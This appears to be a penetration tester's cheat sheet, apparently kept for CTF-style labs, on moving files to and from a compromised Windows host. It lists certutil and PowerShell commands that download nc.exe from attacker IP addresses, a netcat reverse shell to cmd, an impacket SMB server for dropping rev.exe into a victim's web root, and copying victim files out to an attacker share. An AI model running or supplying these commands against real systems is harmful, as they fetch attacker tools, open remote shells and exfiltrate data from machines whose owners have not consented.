# Download and Upload

## Download File From CMD (Not PowerShell) -- 
certutil.exe -urlcache -split -f "http://10.14.17.16:4545/nc.exe" nc.exe

### Reverse Shell
%tmp%\nc.exe IP PORT -e cmd

## Download File From PowerShell) -- 

```
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
```

```
powershell Invoke-WebRequest -Uri "http://10.10.14.22:8081/nc64.exe" -OutFile "C:\Windows\Temp\nc64.exe
```

## Download File From SMB
### Attacker
```
impacket-smbserver drop $(pwd) -smb2support
```

`drop` adalah nama direktori yang akan di share

### Client victim
```
copy \\10.10.14.3\drop\rev.exe c:\Inetpub\wwwroot\rev.exe
```

## Transfer file from victim to attacker
### Client
```
net use z: \\10.10.10.1\share

copy test.txt z:
```

